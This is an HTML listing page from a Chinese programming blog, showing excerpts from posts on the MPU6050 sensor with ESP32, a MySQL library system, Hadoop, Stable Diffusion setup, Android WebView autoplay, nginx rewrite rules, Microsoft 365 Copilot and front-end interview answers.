<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程大咖</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://bcdaka.github.io/posts/">
  <meta property="og:site_name" content="编程大咖">
  <meta property="og:title" content="Posts">
  <meta property="og:description" content="编程大咖的博客">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="website">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程大咖">

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大咖" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大咖</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3032d35649cec23f5e257071a60d53ef/" rel="bookmark">
			一起玩儿物联网人工智能小车（ESP32）——71 姿态传感器MPU6050的使用方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		摘要：本文介绍姿态传感器MPU6050的使用方法
姿态传感器是一种用于测量物体姿态的传感器，它可以检测物体的加速度和角速度，并计算出物体的方向和角度。前边介绍的RPI-1031只能定性的得到物体的倾斜情况，而姿态传感器则可以定量的得到物体倾斜的方向和角度。
MPU6050是一种常用的姿态传感器，它具有高精度、低功耗和成本低廉的特点。本文将介绍MPU6050的基本原理、工作方式、应用领域以及优缺点。
MPU-6050是全球首例6轴运动处理传感器。它集成了3轴微机电系统(Microelectro Mechanical Systems, MEMS)陀螺仪和3轴MEMS加速度计，以及板载数字运动处理器（Digital Motion Processor, DMP）。加速度计可以检测物体的线性加速度，而陀螺仪可以检测物体的角速度。因此，MPU-6050可以测量物体在x、y、z三个方向上的加速度和角速度。通过将加速度计和陀螺仪的测量结果进行数据融合，可以计算出物体的方向和角度。所以，MPU-6050常应用于平衡车、飞行器等需要检测自身姿态的场景。
前面所说的几轴通常指加速度传感器（即加速计）、角速度传感器（即陀螺仪）、磁感应传感器（即电子罗盘）的数量，这三类传感器测量的数据在空间坐标系中都可以被分解为X，Y，Z三个方向轴的力，因此也常常被称为3轴加速度计、3轴陀螺仪、3轴磁力计。
上面3类传感器有其各自的功能特点及应用，比如加速度计可以测量设备的线性加速度，陀螺仪可以测量设备自身的旋转角速度，还有磁力计可以检测设备的方位。通过它们相互组合和匹配融合又可以衍生出更多的不同应用，在叫法上通过这样简单的轴数上相加的可以变成六轴传感器或者九轴传感器。
六轴传感器：通常指的是三轴加速度计+三轴陀螺仪，三轴加速度计是检测三个方向的加速度的，三轴陀螺仪是检测旋转角速度，因此可以用在平衡车、体感游戏机以及飞行器上。
九轴传感器：就是三轴加速度计+三轴陀螺仪+三轴磁力计的组合，在飞行器上是广泛应用的。另外，在九轴传感器基础上再加入气压传感器，从而能获取海拔高度的数据，人们通常称之为十轴传感器。
通常使用的MPU6050模块如下所示：
那么MPU6050所对应的坐标系和角速度方向如下所示：
在上图中可以看到，向右为X轴正方向，向前为Y轴正方向，垂直模块向上为Z轴正方向。旋转角的方向按右手法则定义，即右手大拇指指向轴向，四指弯曲的方向即为绕该轴旋转的方向。
为了称呼方便，给这三个旋转角又起了三个不同的名字：
横滚角（Roll）：即为绕X轴旋转方向的角度；
俯仰角（Pitch）：即为绕Y轴旋转方向的角度；
偏航角（Yaw）：即为绕Z轴旋转方向的角度；
这三者合称为姿态角或欧拉角（Euler angles）。通过一架飞机的姿态来理解这三个角度，应该更容易一些，如下所示：
MPU6050作为首款6轴的姿态传感器，拥有以下一些特性：
1.以数字形式输出6轴或9轴（需外接磁力传感器——通过XCL、XDA进行通信）的旋转矩阵、四元数(quaternion)、欧拉角格式(Euler Angle forma)的融合演算数据（需DMP支持）。
2.具有测量范围为±250、±500、±1000 与±2000°/sec的3轴角速度感测器（陀螺仪）。
3.集成可程序控制，测量范围为±2g、±4g、±8g和±16g的3轴加速度传感器。
4.自带数字运动处理（DMP：Digital Motion Processing）引擎，可减少MCU进行复杂的融合演算、传感器同步化、姿势感应等的负荷。
5.自带一个数字温度传感器。
6.可程序控制的中断(interrupt)（INT接口的功能），支持姿势识别功能。
7.自带1024字节FIFO，有助于降低系统功耗
8.高达400KHz的IIC通信接口
MPU6050模块引脚的功能如下表所示：
引脚
功能
VCC、GND
电源供电，直流3.3V~5V
SCL、SDA
I2C通信引脚（模块已经内置两个4.7K上拉电阻，因此接线时可以直接把SCL和SDA接在GPIO口上）
XCL、XDA
主机I2C通信引脚（为了扩展芯片功能，通常用于外接磁力计或者气压计）
AD0
从机地址最低位（接0则7位从机地址为1101000；接1则7位从机地址为1101001）
INT
中断输出引脚（可以配置芯片内部事件以触发中断引脚的输出）
接下来就来看一个简单的例子，通过一个程序来获得MPU6050的测量数据。首先把MPU6050与ESP32扩展板相连接，连接的方法如下：
MPU6050
ESP32扩展板
VCC
+5V
GND
GND
SCL
P22
SDA
P21
接下来是下载一个支持MPU6050的库，在Arduino IDE中，有很多关于MPU6050的库，我所选择的是MPU6050_tockn库，如下图所示：
使用MPU6050_tockn库读取MPU6050模块的信息需要以下几步：
引入头文件MPU6050_tockn.h创建MPU6050对象调用begin()方法进行初始化调用calcGyroOffsets()方法进行自检调用update()方法更新数据调用各种方法得到各种需要的数据了。 具体代码如下所示：
#include &lt;MPU6050_tockn.h&gt;
#include &lt;Wire.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3032d35649cec23f5e257071a60d53ef/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/816cd5275694db6bc8f83415d44850f3/" rel="bookmark">
			数据库课程设计-图书馆管理系统(2.数据库实现-基于mysql)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如果对你有帮助，可以给卑微的博主留个赞、关注、收藏 (不是) 好像有读者说现在不要积分的资源也要vip才能下，如果下不了可以留邮箱到评论区或者私聊，我也把资源放到github了，地址如下：
https://github.com/goLSX/library_manager_system
如果对你有帮助不妨点个star 拜谢
数据库选用mysql 8.0.25 64位， 配合使用navicat
mysql可以在主页下载安装包，或者网上自己搜索
数据库安装配置可以参考网上的教程，有很多人都做了教程，例如这篇博文Mysql8.0.17压缩包安装——超详细简单教程_singular港的博客-CSDN博客
navicat的安装可参考这篇博文
Navicat16安装教程-图文详解_victor_王泽华的博客-CSDN博客
目录
1. 新建数据库 (模式)
2. 基本表的创建
3. 视图的创建
4. 完整性的创建
5. 触发器创建
6. 存储过程的创建
7. 索引创建
8. 数据库权限管理
9. 备份与恢复策略
安装好navicat和mysql后
先启动mysql服务，然后使用navicat进行连接，连接成功后点击新建查询
1. 新建数据库 (模式) 例如创建数据库名字叫library_db ,之后我们新建的表、存储过程等内容都属于这个数据库(模式)
create database library_db; use library_db; 2. 基本表的创建 readers表
CREATE TABLE readers (
reader_name varchar(20) ,
password varchar(35) ,
name varchar(10) ,
id_num varchar(20) ,
phone_num varchar(15)
);
managers表
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/816cd5275694db6bc8f83415d44850f3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c36ac9dcf9c2aa1e76ee7fe80a54edcf/" rel="bookmark">
			解析Hadoop三大核心组件：HDFS、MapReduce和YARN
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 HadoopHadoop的优势 Hadoop的组成HDFS架构设计Yarn架构设计MapReduce架构设计 总结 在大数据时代，Hadoop作为一种开源的分布式计算框架，已经成为处理大规模数据的首选工具。它采用了分布式存储和计算的方式，能够高效地处理海量数据。Hadoop的核心由三大组件组成：HDFS、MapReduce和YARN。本文将为您逐一介绍这三个组件。
Hadoop Hadoop是一个开源的分布式计算和存储框架，主要解决海量数据的存储和海量数据的分析计算。
Hadoop的优势 高可扩展性：Hadoop可以轻松地扩展到大规模集群，并处理大量的数据。它采用分布式计算的方式，将工作负载分布在集群中的多个节点上，使得系统能够处理海量的数据和高并发请求。
高容错性：Hadoop具有高度的容错能力，即使在设备或任务发生故障的情况下，也能保持数据的完整性和系统的可用性。它通过数据的冗余复制和自动故障转移等机制，确保数据的安全和系统的稳定性。
高效性：通过并行处理和分布式计算，Hadoop能够实现快速的数据处理。它可以将大规模的数据分解为小的任务并在多个节点上并行执行，从而提高处理效率和速度。
处理多种数据类型：Hadoop可以处理各种类型的数据，包括结构化数据、半结构化数据和非结构化数据。它能够灵活地存储和处理数据，支持分布式存储和处理大规模的文本、图像、音频、视频等数据类型。
异构性：Hadoop支持不同类型的硬件和操作系统，并且能够与其他开源工具和框架无缝集成。它提供了统一的接口和API，使得用户可以用各种编程语言编写应用程序，并在Hadoop上运行。
成本效益：相比于传统的数据存储和处理方式，Hadoop具有较低的成本。它使用商业化的廉价硬件，可以通过纵向和横向扩展实现高性能和高可用性，降低了硬件和软件成本。
Hadoop的组成 HDFS架构设计 Hadoop分布式文件系统（Hadoop Distributed File System，HDFS）是Hadoop生态系统中的一个重要组成部分，是用于存储和处理大数据的分布式文件系统。
HDFS采用master/slave架构。一个HDFS集群是由一个Namenode和一定数目的Datanodes组成。Namenode是一个中心服务器，负责管理文件系统的名字空间(namespace)以及客户端对文件的访问。集群中的Datanode一般是一个节点一个，负责管理它所在节点上的存储。HDFS暴露了文件系统的名字空间，用户能够以文件的形式在上面存储数据。从内部看，一个文件其实被分成一个或多个数据块，这些块存储在一组Datanode上。Namenode执行文件系统的名字空间操作，比如打开、关闭、重命名文件或目录。它也负责确定数据块到具体Datanode节点的映射。Datanode负责处理文件系统客户端的读写请求。在Namenode的统一调度下进行数据块的创建、删除和复制。
其架构详细概述如下：
NameNode（nn）：
NameNode是HDFS的主节点，负责管理整个文件系统的命名空间和数据块的元数据信息。它维护文件系统的目录结构、文件的安全权限信息和数据块的位置信息等。NameNode还处理客户端的文件系统操作请求，如文件的读写和块的创建、复制和删除等。
DataNode（dn）：
DataNode是HDFS的工作节点，负责实际存储文件数据和执行文件系统操作的任务。每个DataNode负责管理一定数量的数据块，并定期向NameNode报告数据块的存储信息。DataNode还处理来自客户端和其他DataNode的读取和写入请求，以及数据块的复制和恢复等。
存储指定副本：
HDFS中的文件被分成一系列的数据块，这些数据块会被复制到不同的Datanode上。根据副本配置参数，每个数据块在HDFS中会有多个副本，这样可以提高数据的可靠性和容错性。HDFS会尽量将这些副本存储在不同的机架、节点和硬盘上，以防止硬件故障或网络故障导致的数据丢失。
客户端（Client）：
客户端是使用HDFS的应用程序。它们通过与Namenode和Datanode进行通信来读取和写入文件。客户端向Namenode请求文件的元数据信息，根据元数据信息确定所需数据块的位置，并从Datanode获取数据。客户端还负责处理文件系统的操作，如创建、删除、重命名和移动文件等。
Yarn架构设计 YARN（Yet Another Resource Negotiator）的基本思想是将资源管理和作业调度/监视的功能拆分为单独的守护进程。这个想法是有一个全局的ResourceManager (RM)和每个应用的ApplicationMaster (AM)。应用程序可以是单个作业，也可以是作业DAG。它的架构设计如下：
ResourceManager（资源管理器）：
ResourceManager是YARN集群的主节点，负责整个集群的资源管理和任务调度。它接收来自客户端、应用程序和NodeManager的资源请求，分配和调度集群中的资源。ResourceManager还负责监控集群的健康状态，处理故障和任务的重新分配，以确保高可用性和稳定性。
NodeManager（节点管理器）：
NodeManager是YARN集群中每个节点上的组件，负责管理和监控该节点上的计算资源。NodeManager通过向ResourceManager注册自己的资源和容器信息，将自身纳入到集群的资源管理中。它负责启动和监控容器，接收来自ResourceManager的资源分配指令，并向ResourceManager报告计算资源的使用情况。
ApplicationMaster（应用程序管理器）：
每个在YARN上运行的应用程序都会有一个ApplicationMaster。ApplicationMaster负责协调和管理应用程序的资源需求，与ResourceManager通信并向其申请资源。它还监控应用程序的运行状态和容器的健康度，并处理容器的启动、停止和失败等情况。ApplicationMaster执行应用程序的逻辑，将整个应用程序划分为一系列的任务，并与NodeManager通信来启动和管理任务的执行。
Container（容器）：
在YARN中，任务被封装到一个个容器中。容器是对计算资源的抽象，它由ResourceManager分配给ApplicationMaster，并由ApplicationMaster分配给具体的任务执行。每个容器拥有自己的计算和存储资源，并在NodeManager上创建和运行任务相关的进程。容器提供了高度的隔离性和资源限制，确保应用程序之间不会相互干扰。
ResourceManager有两个主要组件:Scheduler和ApplicationsManager。
Scheduler负责将资源分配给各种正在运行的应用程序，这些应用程序受到熟悉的容量、队列等约束。Scheduler是纯粹的Scheduler，因为它不监视或跟踪应用程序的状态。此外，它不能保证重新启动由于应用程序故障或硬件故障而失败的任务。调度程序根据应用程序的资源需求执行调度功能;它是基于资源容器的抽象概念来实现的，资源容器包含了诸如内存、cpu、磁盘、网络等元素。
ApplicationsManager 负责接受作业提交、协商第一个容器来执行应用程序特定的 ApplicationMaster 并提供在失败时重新启动 ApplicationMaster 容器的服务。每个应用程序的 ApplicationMaster 负责与 Scheduler 协商适当的资源容器，跟踪其状态并监控进度。
MapReduce架构设计 MapReduce是一种分布式计算编程模型，用于处理大规模数据集。它的架构设计包括以下几个组件：
JobTracker（作业调度器）：
JobTracker是MapReduce作业的主节点，负责整个作业的调度和执行。它接收来自客户端的作业请求，将作业划分为多个任务，并分配给各个TaskTracker进行执行。JobTracker还负责监控任务的进度和状态，处理任务的失败和重新分配，以确保作业的顺利运行。
TaskTracker（任务执行器）：
TaskTracker是在每个集群节点上运行的组件，负责执行作业中的任务。它接收来自JobTracker的任务分配指令，并在该节点上启动和管理任务的执行。TaskTracker将任务划分为Map任务和Reduce任务，并负责处理任务的输入输出数据，以及任务的进度和状态更新。
MapTask（映射任务）：
MapTask是MapReduce作业的计算阶段。每个MapTask从输入数据中抽取一部分数据，经过映射函数的处理后生成键值对（key-value pair）。MapTask独立进行执行，处理输入数据的分片，将处理后的中间结果写入本地磁盘。
ReduceTask（归约任务）：
ReduceTask是MapReduce作业的归约阶段。每个ReduceTask接收来自Mapper的输出结果，并按照键进行归约操作，将具有相同键的数据进行合并和计算生成最终结果。ReduceTask也独立执行，将归约后的结果写入最终输出文件。
分布式文件系统：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c36ac9dcf9c2aa1e76ee7fe80a54edcf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e9b89683daade6f5e64e6c3bb4035b3b/" rel="bookmark">
			AiGC学习之Stable Diffusion安装部署
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		AiGC的学习如火如荼，我们也来体验一把。
一：先看电脑配置，建议使用navida显卡，显存8G+，我的显卡截图如下：
二：打开网站 github.comGitHub - AUTOMATIC1111/stable-diffusion-webui: Stable Diffusion web UIhttps://github.com/AUTOMATIC1111/stable-diffusion-webui
下拉到如图的位置，可以看到需要安装Python 3.10.6和git，可以依次点击这两个链接并进行安装。
2.1 ， 安装Python 3.10.6 ，可以选择点击github的链接，或者链接Python Release Python 3.10.6 | Python.org
我的是windows11，下载 Windows installer (64-bit)
并安装，记得勾选 Add Python 3.10 to PATH。 安装之后打开windows 命令提示符【搜索 cmd即可】并执行命令python，确认Python版本是否符合要求。
2.2 安装git，可以点击github的链接或者链接Git - Downloading Package (git-scm.com)
下一步，下一步安装即可， 安装完成，同样打开windows命令提示符，输入命令git，检查是否安装成功。
三：python和git安装成功之后，创建或者选择Stable Diffusion安装目录，我的安装目录为D:\MyDoc\project，
进入到安装目录D:\MyDoc\project后，执行命令git clone https://github.com/AUTOMATIC1111/stable-diffusion-webui.git，获取源码。
四：安装，获取源码后执行命令 1，cd stable-diffusion-webui 2， webui-user.bat ，因为网络的原因，第二条命令可能需要多次尝试，而且执行时间较长，请耐心等待。
该步骤的错误和应对：
4,1 如下提示，表示python的基础安装包安装完成，算是阶段性成果吧。
Installing collected packages: mpmath, urllib3, typing-extensions, sympy, pillow, numpy, networkx, MarkupSafe, idna, filelock, charset-normalizer, certifi, requests, jinja2, torch, torchvision
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e9b89683daade6f5e64e6c3bb4035b3b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5ca625a75366c8181b7cb74d19ae8b68/" rel="bookmark">
			Android WebView访问网页&#43;自动播放视频&#43;自动全屏&#43;切换横屏
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、引言 近期，我发现电视家、火星直播等在线看电视直播的软件都已倒闭，而我奶奶也再无法通过这些平台看电视了。她已六十多岁，快七十岁啦。这些平台的倒下对我来说其实没有多大的影响，但是对于文化不多的她而言，生活中却是少了一大乐趣。因为自己学过编程，所以我想帮她解决这个问题。她只听得懂白话，又最爱看“广东珠江台”，因此，我通过Android的编程技术，为她专门定制一款可以自动看广东珠江台的App，打开即用，免了点来点去的麻烦。虽说需求很小、只够她一人使用，但实现起来却并不简单呀。通过两天时间的深入钻研，最终我还是把这个小需求给实现了。为此编写一篇博客，如果日后自己还需要解决这样的问题时，我就直接ctrl+c加ctrl+v。当然，也希望这篇博客能够为你提供一些指导和帮助。
二、访问网页视频+自动播放的实现思路 由于许多的m3u8链接都已经失效，现在看电视直播只能通过一些官方网页来实现，比如央视网等等。那么，访问网页的话是可以通过Android的WebView来实现，实现的方法非常简单，就是在Activity界面之中添加一个WebView空间，然后通过下面的代码来访问网页：
main_wv = findViewById(R.id.main_wv); main_wv.setWebViewClient(new WebViewClient()); main_wv.setWebChromeClient(new WebChromeClient()); main_wv.loadUrl("https://***.***"); 但是这样的话，最多也只能够竖屏中观看视频，显示十分地有限，而且还不会自动播放，如图：
所以，这里先介绍实现网页访问+自动播放的思路。WebView可以通过自定义的设置来控制它是否支持JavaScript脚本注入，即通过js来实现网页视频的自动播放。第一步是对WebView进行设置，而第二步是执行js自动播放视频的脚本，代码如下：
设置WebView支持js脚本
WebSettings settings = main_wv.getSettings(); // main_wv为WebView控件 settings.setJavaScriptEnabled(true); 执行js自动播放视频的脚本
String js = "javascript:"; js += "var videos = document.getElementsByTagName('video');"; js += "var video_last;"; js += "var video = videos[videos.length-1];"; js += "if (video != undefined &amp;&amp; video != video_last) {"; { js += "video_last = video;"; js += "function video_start() {"; { js += "_VideoEnabledWebView.notifyVideoStart();"; } js += "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5ca625a75366c8181b7cb74d19ae8b68/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/863834b0b43d7eef7c18914eaa526b8d/" rel="bookmark">
			Nginx模块之rewrite模块
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、rewrite模块的基本介绍
1、rewrite功能
2、跳转的场景
3、跳转实现
4、执行顺序
5、语法格式
二、rewrite模块的使用实例
1、基于域名的跳转
现在公司旧域名www.jiu.com有业务需求变更，需要使用新域名www.xin.com代替，但是旧域名不能废除，需要跳转到新域名上，而且后面的参数保持不变。
①第一步先修改主配置文件
第二步：创建所需要目录与文件
第三步：添加域名与ip地址映射关系
第四步：网页验证
2、基于客户端ip访问跳转
公司业务更新版本，使得所有ip访问内容都显示固定维护页面，只有192.168.170.113访问正常。
第二步：设置维护界面并重启服务
第三步：网页验证
3、基于旧域名跳转到新域名后面加目录
第一步：修改主配置文件
第二步：添加临时域名和ip的映射关系
第三步：创建准备的网页文件
第四步：浏览器验证
4、基于参数匹配的跳转
第一步：修改主配置文件
第二步：检查语法并重启服务
第三步：网页验证
第四步：输入错误地址范围
5、基于目录下所有php结尾的文件跳转
第一步：修改主配置文件
第二步：检查语法并重启服务
第三步：网页验证
6、基于最普通的一条url请求的跳转
第一步：修改主配置文件
第二部：检查配置文件并且重启服务
第三步：浏览器中访问测试
一、rewrite模块的基本介绍 1、rewrite功能 rewrite功能就是，使用nginx提供的全局变量或自己设置的变量，使用nginx提供的全局变量或自己设置的变量，结合正则表达式和标记位实现URL重写以及重定向。更换域名后需要保持旧的域名能跳转到新的域名上、某网页发生改变需要跳转到新的页面、网站防盗链等等需求
rewrite只能放在server{},location{},if{}中，并且默认只能对域名后边的除去传递的参数外的字符串起作用。
2、跳转的场景 ①可以调整用户浏览的url，看起来更规范，合乎开发及产品人员的需求。
②为了让搜索引擎网站内容及用户体验更好，企业会将动态url地址伪装成静态地址提供服务。
③网址换新域名后，让旧的访问跳转到新的域名上。
④根据特殊变量，目录，客户端的信息进行url调整等。
3、跳转实现 Nginx：通过ngx_http_rewrite_module 模块支持URL重写、支持if条件判断，但不支持else。
跳转：从一个 location跳转到另一个location，循环最多可以执行10次，超过后nginx将返回500错误。
PCRE支持：perl兼容正则表达式的语法规则匹配。
重写模块 set 指令：创建新的变量并设其值。。
4、执行顺序 首先执行server块里面的rewrite指令
其次执行location匹配
最后执行选定的location中的rewritre指令
5、语法格式 rewrite &lt;regex&gt; &lt;replacement&gt; [flag]; regex ：表示正则匹配规则。 replacement ：表示跳转后的内容。 flag ：表示 rewrite 支持的 flag 标记。 flag标记说明
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/863834b0b43d7eef7c18914eaa526b8d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f21b8fb05afa584ffd8bbe8b4ab0c310/" rel="bookmark">
			Copilot for Microsoft 365 office手把手使用指南
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文介绍Microsoft365商业版+copilot应用的使用说明。本文的相关说明基于Microsoft365商业版软件和网页，只有尊贵的商业版用户才能够完全享有，而个人版/家庭版copilot Pro（名字带着Pro的阉割版，恐怕只有MS敢这么玩）无法使用某些功能。
一、Copilot in Word使用指南
在Word中使用copilot，有两处位置可用：
文档空白处使用copilot直接创建草稿
copilot功能区对已有文档进行聊天、回答，以及编写和汇总文章
1、在空白处直接使用copilot撰写草稿 此处也有两个按钮：
根据输入框内容直接生成
引用其他文件内容生成
①根据输入框内容直接生成 可以看到，每次最多能输入的提示语（Prompt）是2000个token，注意一个汉字或一个英文字母占用一个token，也就是说中文提问带有先天优势。
大约30秒，copilot就给出了一个初稿，3185字，占用4页：
如果觉得满意，可以直接点击“保留”，如果不满意，可以让其重新生成，也可以添加一些补充。
如输入框中继续填写“可以加一些各国对于此技术的法规政策和投资情况”，这样，copilot就会重新生成文档，这次时间要长一些，大约占用了1分钟，并生成了6639字的6页报告，其中关于各国政策类的篇幅占了2页，点击下方链接可以查看此结果：
copilot in word生成的文档示例：储能技术在新能源电力系统中的研究 现状、挑战和前景
现状、挑战和前景
生成的结果总体上而言，就论文草稿、小报告或者申请参会的submission而言比较可用，对学术报告而言差强人意。指望现阶段提供想法copilot完全帮你写好，那属实是想多了。不过目前这个状态对于学术狗来说已经算是高度可用了。
对于一个像我这样的门外汉而言，可以在很短的时间内就初步了解这个行业之前的发展过程、现状以及未来发展趋势，尤其是从各国对于此行业的投资与法律法规来分析发展前景，还是很不错的。尤其是下一步，我准备用此文稿直接生成PPT展示稿，就会更加轻松。
②根据已有的文档进行内容生成 注意：此功能只有尊贵的商业版用户才能体验，个人家庭版copilot Pro没有资格使用。
点击“引用你的内容”后，会出现刚才打开文件：
我们注意到，对话框底部，出现了“从云中浏览文件”（网页版Word应用中使用copilot），点击后弹出onedrive中的内容：
PPT文稿和word文件是可以选择的，也就是说，copilot可以根据已有的PPT文档进行撰写Word文档，也可以根据Word文档进一步加工生成新的文档。但是很遗憾，目前PDF文件并不能直接读取并用来生成文本。
我随手找了一个工作中用的PPT文档，10页的ppt，copilot根据此内容生成了3262字的3页详细Word文档，效果还是蛮好的。
再次提醒，此功能只有尊贵的Microsoft365商业版用户才能使用，个人版家庭版的copilot pro功能无法体验，必须手动将2000个token的prompt填写后才能够生成使用，以查看结果。
并且，只有网页端才可以直接浏览onedrive获取相关文件，桌面端应用只能靠搜索和联想进行获取文件操作。
2、copilot功能区对已有文档进行聊天、回答，以及编写和汇总文章 此功能主要针对已有的Word文档，可以基于文档进行总结，也可以询问有关此文档的问题：
比如，我们将此文档进行归纳摘要：
也可以在文档中进行直接提问：
注意，copilot同时会将总结摘要或者回答此问题的主要引用文字在下方展示，便于查询和确认。
这对于查看诸多长篇幅的分析报告与文件的总结方面，会有较大的辅助作用。而且copilot似乎并没有将对话数量进行限制，这一点要比其他的GPT工具要好。
二、Copilot in PowerPoint 在PowerPoint中使用copilot，只能点击右上角的copilot按钮出现右侧边栏：
与copilot in Word一样，PowerPoint中的copilot也只为尊贵的商业版用户提供了“通过文件创建演示文稿”，个人/家庭版的copilot Pro（你敢信，名字带着Pro的阉割版？）只能通过提交prompt进行创建。
1、通过prompt文本生成PPT 约30秒后，生成了10页图文并茂的PPT：
2、通过文件生成PPT 点击“通过文件创建演示文稿”，下方会给出onedrive中的文件建议，当然你也可以手动输入并搜索相关文件：
使用上文提到的Word文档进行创建，大约1分钟创建：
创建完成！
共生成29页PPT
并且每一页PPT的备注里都是从Word提取的相关文字，这样在演示者视图中可以直接当提示词。说明是经过了提炼和精简的，比原文内容要少。
简直是amazing！
三、Copilot in Excel 目前Excel中的copilot显示预览版：
个人推测，其处理内核与copilot in powerbi一致，因为powerbi中的copilot标志也显示预览版。
1、使用copilot处理已有Excel数据 随手打开一个Excel文档，点击其中的内容，我们发现copilot给出如下提示：
“是否将此数据范围转换为表格，此数据添加到 Excel 表格 后，我可以开始为你提供帮助。是否要将 A1:H13 转换为表格?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f21b8fb05afa584ffd8bbe8b4ab0c310/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bef7df073390b632fb1286461db3ba0f/" rel="bookmark">
			面试前端常见项目问题回答参考
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
问题一：描述一个你在前端项目中遇到的挑战，并说明你是如何解决。
问题二：如何保证前端项目代码质量和可维护性？
问题三：如何进行跨浏览器测试，确保一致的用户体验？
问题四：请描述你在前端项目中进行性能优化的经验。
问题五：请描述一个你在前端项目团队合作中的经验，并如何解决合作中的问题。
问题六：描述一次你在前端项目中遇到的难题并解决的过程。
问题七：如何优化前端项目的 SEO？
当面试涉及前端项目时，除了技术知识和经验，面试官还会关注你的分析和解决问题的能力。以下是一些常见的前端项目面试问题以及回答模板，希望对你有所帮助：
问题一：描述一个你在前端项目中遇到的挑战，并说明你是如何解决。 在一个前端项目中，我曾遇到过性能优化方面的挑战。具体来说，页面加载速度较慢，影响用户体验。经过分析，我发现主要原因是页面资源加载过多和未经压缩。为了解决这个问题，我采取了以下措施：
使用Webpack对资源进行打包和压缩，减少HTTP请求数量和资源体积。引入懒加载和按需加载的策略，优化页面加载速度。使用CDN加速服务，提高静态资源的加载速度。对页面进行性能测试和监控，及时调整和优化。 经过这些措施，页面加载速度得到了明显提升，用户体验也得到了改善。
问题二：如何保证前端项目代码质量和可维护性？ 在前端项目中，为了保证代码质量和可维护性，我会采取以下策略：
遵循编码规范和最佳实践，确保代码风格统一。使用模块化开发，提高代码复用性和可维护性。编写单元测试和集成测试，保证代码质量和功能的稳定性。参与代码审查，及时发现和修复潜在问题。使用版本控制工具对代码进行管理，确保代码的可追溯性和安全性。 以上是我在前端项目中保证代码质量和可维护性的一些做法，这有助于提高团队的开发效率和项目的可持续性。
问题三：如何进行跨浏览器测试，确保一致的用户体验？ 在前端项目中，跨浏览器兼容性是一个重要的问题。为了确保在不同浏览器上获得一致的用户体验，我会采取以下策略：
使用特性检测和垫片库，解决不同浏览器支持的差异性。编写自动化测试用例，通过工具如Selenium进行多浏览器测试。使用CSS Hack和浏览器前缀等技术，解决浏览器兼容性问题。对用户反馈和数据进行统计分析，及时调整和优化页面的兼容性。在开发过程中持续关注浏览器市场份额和趋势，采取相应的兼容性策略。 通过以上措施，我能够确保前端项目在不同浏览器上有良好的兼容性，提供一致的用户体验。
问题四：请描述你在前端项目中进行性能优化的经验。 在前端项目中，性能优化是至关重要的。为了提升页面加载速度和用户体验，我通常会采取以下措施：
对静态资源进行压缩合并，减少页面请求次数和资源大小。使用懒加载和按需加载技术，优化页面渲染速度。优化图片加载，如使用雪碧图、图片压缩等方式。缓存优化，利用浏览器缓存、CDN缓存等机制提高页面加载速度。代码优化，避免DOM操作、减少HTTP请求等，提升页面性能。 通过这些性能优化策略，我成功地提升了前端项目的性能表现，提高了用户体验和页面加载速度。
问题五：请描述一个你在前端项目团队合作中的经验，并如何解决合作中的问题。 团队合作是前端项目中不可或缺的一部分。在过去的项目中，我承担了前端开发的角色，也积极参与团队合作，具体经验包括：
